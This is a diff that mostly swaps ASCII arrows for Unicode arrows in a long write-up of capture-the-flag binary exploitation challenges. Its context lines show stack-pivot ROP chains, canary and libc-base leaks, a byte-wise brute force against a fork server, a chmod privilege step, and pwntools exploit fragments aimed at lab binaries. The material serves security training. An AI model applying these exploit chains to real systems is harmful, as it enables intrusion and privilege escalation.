@@ -11144,7 +11144,7 @@ ASLR randomizes 28 bits of the libc base (bits 12–39). Since the base is alway
 - [x] Offset between the location of the buffer and the location of the stored return pointer: `112`
    - Location of the buffer: `0x7ffedfb5b0f8`
    - Location of the saved return pointer: `0x7ffedfb5b168`
-- [x] Locations of required ROP gadgets: `leave ; ret` at libc offset `0x578c8` --> 4096-way brute force
+- [x] Locations of required ROP gadgets: `leave ; ret` at libc offset `0x578c8` → 4096-way brute force
 - [x] Offset of the overwritten stored base pointer value from the buffer: `104` (we write `buf - 16`)
 
 ### ROP chain: Stack pivot + ret2win
@@ -11202,8 +11202,8 @@ rsp: 0x7ffedfb5b160
 
 ═══════════════════════════════════════════════════════════════════════════════════
 rip --> leave ; ret  (main's epilogue)
-	// leave: mov rsp, rbp --> rsp = 0x7ffedfb5b160
-	//        pop rbp      --> rbp = buf - 16,  rsp = 0x7ffedfb5b168
+	// leave: mov rsp, rbp → rsp = 0x7ffedfb5b160
+	//        pop rbp      → rbp = buf - 16,  rsp = 0x7ffedfb5b168
 	// ret:   rip = leave ; ret gadget in libc
 ═══════════════════════════════════════════════════════════════════════════════════
 
@@ -11220,8 +11220,8 @@ rbp: 0x7ffedfb5b0e8
 
 ═══════════════════════════════════════════════════════════════════════════════════
 rip --> leave ; ret  (libc gadget)
-	// leave: mov rsp, rbp --> rsp = 0x7ffedfb5b0e8
-	//        pop rbp      --> rbp = [0x7ffedfb5b0e8] (don't care),  rsp = 0x7ffedfb5b0f0
+	// leave: mov rsp, rbp → rsp = 0x7ffedfb5b0e8
+	//        pop rbp      → rbp = [0x7ffedfb5b0e8] (don't care),  rsp = 0x7ffedfb5b0f0
 	// ret:   rip = [0x7ffedfb5b0f0] = win()  
 ═══════════════════════════════════════════════════════════════════════════════════
 
@@ -11235,7 +11235,7 @@ Stack:
 rip --> win()
 	// open("/flag", O_RDONLY)
 	// read(fd, rsp, 0x100)
-	// write(1, rsp, n)   --> flag printed to stdout
+	// write(1, rsp, n)   → flag printed to stdout
 ═══════════════════════════════════════════════════════════════════════════════════
 ```
 
@@ -11605,7 +11605,7 @@ ASLR randomizes 28 bits of the libc base (bits 12–39). Since the base is alway
 - [x] Offset between the location of the buffer and the location of the stored return pointer: `80`
    - Location of the buffer: `0x7ffdc2d2b198`
    - Location of the stored return pointer: `0x7ffdc2d2b1e8`
-- [x] Locations of required ROP gadgets: `leave ; ret` at libc offset `0x578c8` --> 4096-way brute force
+- [x] Locations of required ROP gadgets: `leave ; ret` at libc offset `0x578c8` → 4096-way brute force
 - [x] Offset of the overwritten stored base pointer value from the buffer: `72` (we write `buf - 16`)
 
 ### ROP chain: Stack pivot + ret2win
@@ -11734,9 +11734,9 @@ Three problems to solve: canary, ASLR, and privilege. The trick is doing it in *
 1. Use the arbitrary read primitive to fetch `buf + 72`, exactly where the canary lives on the stack.
 2. Partially overwrite only the low 2 bytes of saved RIP with a value targeting `__libc_start_main+0x69` inside Libc. That offset contains:
 ```
-mov argv from lsm_stack --> rsi
-mov argc from lsm_stack --> edi
-mov main_ptr from lsm_stack --> rax
+mov argv from lsm_stack → rsi
+mov argc from lsm_stack → edi
+mov main_ptr from lsm_stack → rax
 call *rax                       ← restarts main() cleanly
 ```
  
@@ -12268,7 +12268,7 @@ Stack:
 
 ═══════════════════════════════════════════════════════════════════════════════════
 rip --> __libc_start_main+0x69
-	// loads argv, argc, &main from lsm stack frame, calls main() --> restart
+	// loads argv, argc, &main from lsm stack frame, calls main() → restart
 ═══════════════════════════════════════════════════════════════════════════════════
 ```
 
@@ -12420,7 +12420,7 @@ for attempt in range(200):
 
     p = process('/challenge/guarded-gadgets-easy')
     try:
-        # --- STAGE 1: Leak canary, 2-byte partial overwrite --> restart main() ---
+        # --- STAGE 1: Leak canary, 2-byte partial overwrite → restart main() ---
         p.recvuntil(b'located at: ')
         buf = int(p.recvline().strip().rstrip(b'.'), 16)
 
@@ -12430,7 +12430,7 @@ for attempt in range(200):
         p.recvuntil(b' = 0x')
         canary = int(p.recvline().strip(), 16)
 
-        # Overwrite low 2 bytes of saved RIP --> __libc_start_main+0x69 (calls main)
+        # Overwrite low 2 bytes of saved RIP → __libc_start_main+0x69 (calls main)
         p.send(b'A' * 72 + p64(canary) + b'B' * 8 + restart_bytes)
 
         try:
@@ -12442,7 +12442,7 @@ for attempt in range(200):
         # --- STAGE 2: Leak libc base via saved RIP, send chmod ROP chain ---
         buf2 = int(p.recvline().strip().rstrip(b'.'), 16)
 
-        # Leak saved RIP at buf + 88 --> __libc_start_main+243 --> libc base
+        # Leak saved RIP at buf + 88 → __libc_start_main+243 → libc base
         p.recvuntil(b'Address in hex to read from:')
         p.sendline(hex(buf2 + 88).encode())
         p.recvuntil(b' = 0x')
@@ -12945,7 +12945,7 @@ for attempt in range(200):
 
     p = process('/challenge/guarded-gadgets-easy')
     try:
-        # --- STAGE 1: Leak canary, 2-byte partial overwrite --> restart main() ---
+        # --- STAGE 1: Leak canary, 2-byte partial overwrite → restart main() ---
         p.recvuntil(b'located at: ')
         buf = int(p.recvline().strip().rstrip(b'.'), 16)
 
@@ -12955,7 +12955,7 @@ for attempt in range(200):
         p.recvuntil(b' = 0x')
         canary = int(p.recvline().strip(), 16)
 
-        # Overwrite low 2 bytes of saved RIP --> __libc_start_main+0x69 (calls main)
+        # Overwrite low 2 bytes of saved RIP → __libc_start_main+0x69 (calls main)
         p.send(b'A' * 72 + p64(canary) + b'B' * 8 + restart_bytes)
 
         try:
@@ -12967,7 +12967,7 @@ for attempt in range(200):
         # --- STAGE 2: Leak libc base via saved RIP, send chmod ROP chain ---
         buf2 = int(p.recvline().strip().rstrip(b'.'), 16)
 
-        # Leak saved RIP at buf + 88 --> __libc_start_main+243 --> libc base
+        # Leak saved RIP at buf + 88 → __libc_start_main+243 → libc base
         p.recvuntil(b'Address in hex to read from:')
         p.sendline(hex(buf2 + 88).encode())
         p.recvuntil(b' = 0x')
@@ -13052,17 +13052,17 @@ Four problems to solve: canary, PIE, libc, and privilege. The server forks a chi
 
 The fork server keeps the same canary across all connections. Oracle: `### Goodbye!` at the end of output means `challenge()` returned cleanly (canary intact). No `### Goodbye!` means `__stack_chk_fail` killed the process before `main()` could print it.
 
-#### Stage 2: Brute-force saved RIP bytes 1–5 --> binary base
+#### Stage 2: Brute-force saved RIP bytes 1–5 -> binary base
 
 `read()` writes exactly the bytes we send and leaves everything above untouched on the stack. The saved RIP in `challenge()`'s frame equals `binary_base + 0x2ad3`. Byte 0 (`0xd3`) is fixed since `binary_base` is page-aligned. By sending `pad + canary + 0 (rbp) + known_prefix + guess_byte`, the remaining saved RIP bytes stay at their original stack values. The oracle is identical to Stage 1: `### Goodbye!` appears only when the assembled 8-byte saved RIP is valid.
 
 #### Stage 3: Leak libc base via `puts(puts@got)`
 
-With `binary_base` known, chain `pop rdi ; ret` (from the binary) --> `puts@got` --> `puts@plt`. `puts` prints the 6-byte libc address of `puts`, giving us `libc_base`.
+With `binary_base` known, chain `pop rdi ; ret` (from the binary) -> `puts@got` -> `puts@plt`. `puts` prints the 6-byte libc address of `puts`, giving us `libc_base`.
 
 #### Stage 4: `chmod("!", 0o777)`
 
-`"!\x00"` already exists at offset `0x2a32` within libc. Passing `libc_base + 0x2a32` as the `chmod` path eliminates any need for the stack buffer address.
+`b"!\x00"` already exists at offset `0x2a32` within libc. Passing `libc_base + 0x2a32` as the `chmod` path eliminates any need for the stack buffer address.
 
 ### Binary analysis
 
@@ -13323,12 +13323,12 @@ Stack (correct byte):
                            ╎  .. .. .. .. .. .. .. ..  ╎
 
 ═══════════════════════════════════════════════════════════════════════════════════
-correct byte  --> canary intact --> challenge() returns --> main() prints ### Goodbye!
-wrong byte    --> __stack_chk_fail kills process --> ### Goodbye! never printed
+correct byte  → canary intact → challenge() returns → main() prints ### Goodbye!
+wrong byte    → __stack_chk_fail kills process → ### Goodbye! never printed
 ═══════════════════════════════════════════════════════════════════════════════════
 ```
 
-#### Stage 2: Brute-force saved RIP bytes 1–5 --> binary base
+#### Stage 2: Brute-force saved RIP bytes 1–5 → binary base
 
 ```
 <== Value is stored at the address
@@ -13353,8 +13353,8 @@ g?       byte 1 — current guess
 5a..5d   bytes 2–7 — unwritten, retain original stack values
 
 ═══════════════════════════════════════════════════════════════════════════════════
-correct g? --> saved RIP valid --> challenge() returns --> ### Goodbye!
-wrong g?   --> saved RIP invalid --> process crashes --> no ### Goodbye!
+correct g? → saved RIP valid → challenge() returns → ### Goodbye!
+wrong g?   → saved RIP invalid → process crashes → no ### Goodbye!
 ═══════════════════════════════════════════════════════════════════════════════════
 
 binary_base = assembled_saved_rip - 0x2ad3
@@ -13410,7 +13410,7 @@ Registers:
 rdi: binary_base + 0x4f30
 
 Function call setup:
-puts(puts@got) --> prints 6-byte libc address of puts
+puts(puts@got) → prints 6-byte libc address of puts
 
 ═══════════════════════════════════════════════════════════════════════════════════
 rip --> puts@plt
@@ -13606,7 +13606,7 @@ for i in range(7):
 canary = u64(known_canary)
 print(f'[*] Canary: {hex(canary)}')
 
-# --- STAGE 2: Brute-force saved RIP bytes 1–5 --> binary base ---
+# --- STAGE 2: Brute-force saved RIP bytes 1–5 → binary base ---
 # read() writes exactly what we send; unwritten bytes retain their original stack
 # values. Oracle identical to Stage 1.
 print('[*] Stage 2: Brute-forcing saved RIP...')
@@ -13744,13 +13744,13 @@ Four problems to solve: canary, PIE, libc, and privilege. The server forks a chi
 
 The fork server keeps the same canary across all connections. Oracle: `### Goodbye!` at the end of output means `challenge()` returned cleanly (canary intact). No `### Goodbye!` means `__stack_chk_fail` killed the process before `main()` could print it.
 
-#### Stage 2: Brute-force saved RIP bytes 1–5 --> binary base
+#### Stage 2: Brute-force saved RIP bytes 1–5 → binary base
 
 `read()` writes exactly the bytes we send and leaves everything above untouched on the stack. The saved RIP in `challenge()`'s frame equals `binary_base + 0x1726`. Byte 0 (`0x26`) is fixed since `binary_base` is page-aligned. By sending `pad + canary + 0 (rbp) + known_prefix + guess_byte`, the remaining saved RIP bytes stay at their original stack values. The oracle is identical to Stage 1: `### Goodbye!` appears only when the assembled 8-byte saved RIP is valid.
 
 #### Stage 3: Leak libc base via `puts(puts@got)`
 
-With `binary_base` known, chain `pop rdi ; ret` (from the binary) --> `puts@got` --> `puts@plt`. `puts` prints the 6-byte libc address of `puts`, giving us `libc_base`.
+With `binary_base` known, chain `pop rdi ; ret` (from the binary) → `puts@got` → `puts@plt`. `puts` prints the 6-byte libc address of `puts`, giving us `libc_base`.
 
 #### Stage 4: `chmod("!", 0o777)`
 
@@ -14087,7 +14087,7 @@ for i in range(7):
 canary = u64(known_canary)
 print(f'[*] Canary: {hex(canary)}')
 
-# --- STAGE 2: Brute-force saved RIP bytes 1–5 --> binary base ---
+# --- STAGE 2: Brute-force saved RIP bytes 1–5 → binary base ---
 # read() writes exactly what we send; unwritten bytes retain their original stack
 # values. Oracle identical to Stage 1.
 print('[*] Stage 2: Brute-forcing saved RIP...')
